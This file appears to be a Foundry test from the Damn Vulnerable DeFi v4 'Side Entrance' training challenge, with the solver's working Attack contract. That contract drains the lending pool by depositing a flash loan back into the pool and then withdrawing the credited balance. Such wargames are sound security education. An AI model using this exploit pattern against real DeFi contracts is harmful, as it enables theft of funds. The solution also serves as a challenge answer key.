// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console2} from "forge-std/Test.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // console2.log("pool address before:", address(pool));
        // console2.log("pool balance:", address(pool).balance);
        Attack atk = new Attack(address(pool), recovery);
        atk.st();
        // console2.log("funds in the attack :", address(atk).balance);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(
            recovery.balance,
            ETHER_IN_POOL,
            "Not enough ETH in recovery account"
        );
    }
}

contract Attack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(address _pool, address _player) {
        // console2.log("pool address:", address(_pool));
        pool = SideEntranceLenderPool(address(_pool));
        recovery = _player;
        // console2.log("pool address:", address(pool));
        // console2.log("pool balance:", address(pool).balance);
    }

    function execute() external payable override {
        // console2.log("pool balance:", address(pool).balance);
        // console2.log("pool address:", address(pool));
        // console2.log("msg.sender:", msg.sender);
        // console2.log("this attack address:", address(this));
        pool.deposit{value: address(this).balance}();
    }

    function st() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        console2.log("attack contract got :", address(this).balance);
        (bool success, ) = payable(recovery).call{value: address(this).balance}(
            ""
        );
        if (!success) {
            revert();
        }
    }

    fallback() external payable {}

    receive() external payable {}
}
